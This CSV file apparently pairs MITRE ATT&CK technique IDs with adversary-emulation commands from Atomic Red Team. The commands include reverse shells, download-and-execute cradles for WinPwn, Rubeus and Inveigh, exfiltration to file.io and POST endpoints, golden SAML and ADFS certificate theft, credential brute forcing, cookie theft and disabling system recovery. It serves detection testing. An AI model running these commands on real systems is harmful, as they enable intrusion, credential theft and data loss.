mitre_id,command
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"" "
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;   "
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1001,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh   "
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte # id_5649"
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""  "
T1087,if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi; if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi; cat #{output_file}   
T1025,"POWERSHELL.EXE -C ""GET-VOLUME | WHERE-OBJECT {$_.DRIVETYPE -EQ 'REMOVABLE'} | FOREACH-OBJECT { GET-CHILDITEM -PATH ($_.DRIVELETTER + ':\*') -RECURSE -INCLUDE '*.DOC*','*.XLS*','*.TXT','*.PDF' -ERRORACTION SILENTLYCONTINUE | FOREACH-OBJECT {WRITE-OUTPUT $_.FULLNAME} } ; IF (-NOT (GET-VOLUME | WHERE-OBJECT {$_.DRIVETYPE -EQ 'REMOVABLE'})) { WRITE-OUTPUT 'NO REMOVABLE MEDIA.' }"""
T1539,"OSASCRIPT -E 'TELL APPLICATION ""FINDER""' -E 'SET DESTINATIONFOLDERPATH TO POSIX FILE ""#{DESTINATION_PATH}""' -E 'SET SAFARIFOLDER TO ((PATH TO LIBRARY FOLDER FROM USER DOMAIN AS TEXT) & ""CONTAINERS:COM.APPLE.SAFARI:DATA:LIBRARY:COOKIES:"")' -E 'DUPLICATE FILE ""COOKIES.BINARYCOOKIES"" OF FOLDER SAFARIFOLDER TO FOLDER DESTINATIONFOLDERPATH WITH REPLACING' -E 'END TELL'"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1592,"GET-CIMINSTANCE -QUERY ""SELECT * FROM WIN32_PNPENTITY WHERE (PNPCLASS = 'IMAGE' OR PNPCLASS = 'CAMERA')"""
T1204,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta' # id_9541"
T1049,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -np 2>/dev/null || true; fi  
T1555,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') BROWSERPWN -CONSOLEOUTPUT -NONINTERACTIVE
T1018,arp -a | grep -v '^?' 
T1564,"echo cmd /c echo ""shell code execution.""> #{file_name}:#{ads_filename} for /f ""usebackq delims=?"" %i in (#{file_name}:#{ads_filename}) do %i"
T1037,"sudo echo osascript -e 'tell app ""finder"" to display dialog ""hello world""' >> /etc/rc.common   "
T1123,$mic = get-audiodevice -recording set-audiodevice -id $mic.id start-sleep -seconds 5 # id_5064
T1007,launchctl list # id_4343
T1007,net.exe start >> #{output_file}
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }"
T1007,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } }
T1014,"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""   "
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1113,screencapture #{output_file} # id_9914
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack # id_2791"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose"
T1221,"start ""#{docx_file}"" # id_3485"
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"""
T1187,"IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/POWERSHARPPACK/MASTER/POWERSHARPBINARIES/INVOKE-INTERNALMONOLOGUE.PS1') INVOKE-INTERNALMONOLOGUE -COMMAND ""-DOWNGRADE TRUE -IMPERSONATE TRUE -RESTORE TRUE"""
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1497,"IF [ ""$(SYSTEM_PROFILER SPHARDWAREDATATYPE | GREP ""MODEL IDENTIFIER"" | GREP -V 'MAC')"" != """" ]; THEN ECHO 'VIRTUALIZATION ENVIRONMENT DETECTED'; FI;"
T1110,"import-module -name azuread $passwords = ""#{passwords}"".split(""{`n}"") foreach($password in $passwords) { $pword = convertto-securestring -string ""$password"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword try { write-host "" [-] attempting ${password} on account #{username}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{username}:${password} are valid credentials!`r`n"" break } catch { write-host "" [-] #{username}:${password} invalid credentials.`r`n"" } } write-host ""end of bruteforce"" # id_9635"
T1560,"mkdir -p #{test_folder} cd #{test_folder}; touch a b c d e f g zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./* echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip ls -l #{test_folder}  "
T1490,"reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\policies\microsoft\windows nt\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disableconfig"" /t ""reg_dword"" /d ""1"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\systemrestore"" /v ""disablesr"" /t ""reg_dword"" /d ""1"" /f # id_7824"
T1047,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute} "
T1572,nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 & # id_1457
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose   "
T1197,bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file}   
T1531,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} /delete  
T1119,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1569,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc.exe start #{service_name} sc.exe delete #{service_name}  "
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""   "
T1201,net accounts # id_7636
T1220,"wmic #{wmic_command} /format:""#{remote_xsl_file}""  "
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y # id_5279"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_6146
T1059,"which_python=$(which python || which python3 || which python3.9 || which python2) echo 'import requests' > #{python_script_name} echo 'import os' >> #{python_script_name} echo 'url = ""#{script_url}""' >> #{python_script_name} echo 'malicious_command = ""#{executor} #{payload_file_name} #{script_args}""' >> #{python_script_name} echo 'session = requests.session()' >> #{python_script_name} echo 'source = session.get(url).content' >> #{python_script_name} echo 'fd = open(""#{payload_file_name}"", ""wb+"")' >> #{python_script_name} echo 'fd.write(source)' >> #{python_script_name} echo 'fd.close()' >> #{python_script_name} echo 'os.system(malicious_command)' >> #{python_script_name} $which_python -c 'import py_compile; py_compile.compile(""#{python_script_name}"", ""#{python_binary_name}"")' $which_python #{python_binary_name}"
T1552,"import-module activedirectory -force import-module aadinternals -force | out-null #get configuration $dcservername = (get-addomaincontroller).hostname $svc = get-adobject -filter * -properties objectguid,objectsid | where-object name -eq ""#{adfs_service_account_name}"" $pword = convertto-securestring -string ""#{replication_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{replication_user}, $pword # use dcsync to fetch the adfs service account's nt hash $hash = get-aadintadusernthash -objectguid $svc.objectguid -credentials $credential -server $dcservername -ashex $adfsconfig = export-aadintadfsconfiguration -hash $hash -sid $svc.objectsid.value -server #{adfs_server_name} # get certificates decryption key $configuration = [xml]$adfsconfig $group = $configuration.servicesettingsdata.policystore.dkmsettings.group $container = $configuration.servicesettingsdata.policystore.dkmsettings.containername $parent = $configuration.servicesettingsdata.policystore.dkmsettings.parentcontainerdn $base = ""ldap://cn=$group,$container,$parent"" $adsearch = [system.directoryservices.directorysearcher]::new([system.directoryservices.directoryentry]::new($base)) $adsearch.filter = '(name=cryptopolicy)' $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""displayname"") | out-null $aduser = $adsearch.findone() $keyobjectguid = $aduser.properties[""displayname""] $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""thumbnailphoto"") | out-null $adsearch.filter=""(l=$keyobjectguid)"" $aduser=$adsearch.findone() $key=[byte[]]$aduser.properties[""thumbnailphoto""][0] # get encrypted certificates from configuration and decrypt them export-aadintadfscertificates -configuration $adfsconfig -key $key get-childitem | where-object {$_ -like ""adfs*""} write-host ""`ncertificates retrieved successfully"""
T1574,dyld_insert_libraries=#{dylib_file} #{file_to_inject} 
T1125,REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\CAPABILITYACCESSMANAGER\CONSENTSTORE\WEBCAM\NONPACKAGED\C:#WINDOWS#TEMP#ATOMIC.EXE /V LASTUSEDTIMESTART /T REG_BINARY /D A273B6F07104D601 /F REG ADD HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\CAPABILITYACCESSMANAGER\CONSENTSTORE\WEBCAM\NONPACKAGED\C:#WINDOWS#TEMP#ATOMIC.EXE /V LASTUSEDTIMESTOP /T REG_BINARY /D 96EF514B7204D601 /F
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1074,"compress-archive -path ""#{input_file}"" -destinationpath #{output_file} -force   "
T1014,sudo insmod #{rootkit_path}/#{rootkit_name}.ko
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte # id_7693"
T1087,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *"
T1615,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') GPOREMOTEACCESSPOLICY -CONSOLEOUTPUT -NONINTERACTIVE
T1614,"$info = @{ uilanguage = get-winuilanguageoverride userlanguages = (get-winuserlanguagelist).languagetag -join ', ' systemlocale = get-winsystemlocale currentculture = [system.globalization.cultureinfo]::currentculture.name currentuiculture = [system.globalization.cultureinfo]::currentuiculture.name timezone = (get-timezone).id } $info.getenumerator() | foreach-object { ""$($_.name): $($_.value)"" } # id_3902"
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" } # id_8826"
T1021,"copy c:\windows\system32\calc.exe 'c:\users\#{user}\appdata\local\microsoft\windowsapps\foxprow.exe' $com = [system.activator]::createinstance([type]::gettypefromprogid(""excel.application"",""#{computer_name}"")) $com.activatemicrosoftapp(""5"")"
T1055,$pathtoatomicsfolder\t1055\bin\x64\uuidfromstringa.exe -debug
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"""
T1140,encoded=$(echo '#{message}' | b64encode -r -) printf $encoded | b64decode -r echo $encoded | b64decode -r echo $(echo $encoded) | b64decode -r echo $encoded > #{encoded_file} && b64encode -r #{encoded_file} echo $encoded > #{encoded_file} && b64decode -r < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | b64decode -r echo $encoded > #{encoded_file} && cat < #{encoded_file} | b64decode -r
T1095,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}"
T1546,"$o= [activator]::createinstance([type]::gettypefromclsid(""9ba05972-f6a8-11cf-a442-00a0c90a8f39"")) $item = $o.item() $item.document.application.shellexecute(""cmd.exe"",""/c calc.exe"",""c:\windows\system32"",$null,0)"
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1654,wevtutil enum-logs # id_5603
T1482,nltest /domain_trusts nltest /trusted_domains # id_5225
T1030,"$FILE = [SYSTEM.IO.FILE]::OPENREAD(#{SOURCE_FILE_PATH}) $CHUNKSIZE = #{CHUNK_SIZE} * 1KB $BUFFER = NEW-OBJECT BYTE[] $CHUNKSIZE WHILE ($BYTESREAD = $FILE.READ($BUFFER, 0, $BUFFER.LENGTH)) { $ENCODEDCHUNK = [CONVERT]::TOBASE64STRING($BUFFER, 0, $BYTESREAD) INVOKE-WEBREQUEST -URI #{DESTINATION_URL} -METHOD POST -BODY $ENCODEDCHUNK } $FILE.CLOSE()"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1112,reg add hkey_current_user\software\microsoft\windows\currentversion\winlogon /t reg_dword /v allowmultipletssessions /d 1 /f   
T1482,"""#{TRUFFLESNOUT_PATH}"" FOREST -N #{DOMAIN} ""#{TRUFFLESNOUT_PATH}"" DOMAIN -N #{DOMAIN}"
T1609,"DOCKER BUILD -T T1609 $PATHTOATOMICSFOLDER/T1609/SRC/ DOCKER RUN --NAME T1609_CONTAINER --RM -ITD T1609 BASH /TMP/SCRIPT.SH DOCKER EXEC -I T1609_CONTAINER BASH -C ""CAT /TMP/OUTPUT.TXT"""
T1649,"$ARCHIVE=""$ENV:PUBLIC\T1649\ATOMIC_CERTS.ZIP"" $EXFILPATH=""$ENV:PUBLIC\T1649\CERTS"" ADD-TYPE -ASSEMBLY ""SYSTEM.IO.COMPRESSION.FILESYSTEM"" REMOVE-ITEM $(SPLIT-PATH $EXFILPATH) -RECURSE -FORCE -ERRORACTION IGNORE MKDIR $EXFILPATH | OUT-NULL FOREACH ($CERT IN (GCI CERT:\CURRENTUSER\MY)) { EXPORT-CERTIFICATE -CERT $CERT -FILEPATH $EXFILPATH\$($CERT.FRIENDLYNAME).CER} [IO.COMPRESSION.ZIPFILE]::CREATEFROMDIRECTORY($EXFILPATH, $ARCHIVE)"
T1490,sudo tmutil disable # id_2431
T1482,"""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\ADFIND.EXE"" #{OPTIONAL_ARGS} -GCB -SC TRUSTDMP"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1072,# DEPLOY 7-ZIP USING CHOCOLATEY CHOCO INSTALL -Y 7ZIP
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1123,sh #{filename} #{audiofile} #{duration} 
T1552,MKDIR #{OUTPUT_FOLDER} FIND #{SEARCH_PATH} -TYPE D -NAME '.GNUPG' 2>/DEV/NULL -EXEC RSYNC -RR {} #{OUTPUT_FOLDER} \;
T1047,wmic process call create #{process_to_execute}
T1558,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""kerberoast /format:hashcat /nowrap"" # id_7136"
T1615,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') GPOREMOTEACCESSPOLICY -CONSOLEOUTPUT -NONINTERACTIVE
T1614,#{curl_path} -k #{ip_lookup_url}   
T1040,netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10 # id_7099
T1202,"scriptrunner.exe -appvscript ""#{payload_path}""   "
T1007,schtasks /query /fo list /v
T1518,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" /v svcversion # id_8067"
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}   "
T1033,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append
T1136,"dscl . -create /users/#{username} dscl . -create /users/#{username} usershell /bin/zsh dscl . -create /users/#{username} realname ""#{realname}"" dscl . -create /users/#{username} uniqueid ""1010"" dscl . -create /users/#{username} primarygroupid 80 dscl . -create /users/#{username} nfshomedirectory /users/#{username} # id_3513"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"" # id_9869"
T1201,get-addefaultdomainpasswordpolicy
T1497,IF (IOREG -L | GREP -E MANUFACTURER -E 'VENDOR NAME' | GREP -IE 'ORACLE|VIRTUALBOX|VMWARE|PARALLELS') THEN ECHO 'VIRTUALIZATION ENVIRONMENT DETECTED'; FI;
T1055,"""#{exe_binary}"""
T1083,"$folderarray = @(""desktop"", ""downloads"", ""documents"", ""appdata/local"", ""appdata/roaming"") get-childitem -path $env:homedrive -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path $env:programfiles -erroraction silentlycontinue | out-file -append #{file_to_output} get-childitem -path ""${env:programfiles(x86)}"" -erroraction silentlycontinue | out-file -append #{file_to_output} $usersfolder = ""$env:homedrive\users\"" foreach ($directory in get-childitem -path $usersfolder -erroraction silentlycontinue) { foreach ($secondarydirectory in $folderarray) {get-childitem -path ""$usersfolder/$directory/$secondarydirectory"" -erroraction silentlycontinue | out-file -append #{file_to_output}} } cat #{file_to_output} # id_4800"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 1 # id_8868"
T1201,net accounts  
T1546,if not exist c:\windows\system32\displayswitch_backup.exe (copy c:\windows\system32\displayswitch.exe c:\windows\system32\displayswitch_backup.exe) else ( pushd ) takeown /f c:\windows\system32\displayswitch.exe /a icacls c:\windows\system32\displayswitch.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\displayswitch.exe 
T1021,"set-itemproperty -path 'hklm:\system\currentcontrolset\control\terminal server\winstations\rdp-tcp' -name ""portnumber"" -value #{new_remote_port} new-netfirewallrule -displayname 'rdpportlatest-tcp-in' -profile 'public' -direction inbound -action allow -protocol tcp -localport #{new_remote_port}   "
T1569,"""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\PSEXEC.EXE"" \\#{REMOTE_HOST} -I -U #{USER_NAME} -P #{PASSWORD} -ACCEPTEULA ""C:\WINDOWS\SYSTEM32\CALC.EXE"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port} 
T1217,"find / -path ""*/.config/chromium/*/bookmarks"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null # id_4676"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1048,curl -f 'file=@#{input_file}' -f 'maxdownloads=1' -f 'autodelete=true' https://file.io/
T1056,"AUDITCTL -A ALWAYS,EXIT -F ARCH=B64 -S EXECVE -K CMDS AUDITCTL -A ALWAYS,EXIT -F ARCH=B32 -S EXECVE -K CMDS WHOAMI; AUSEARCH -I --START NOW"
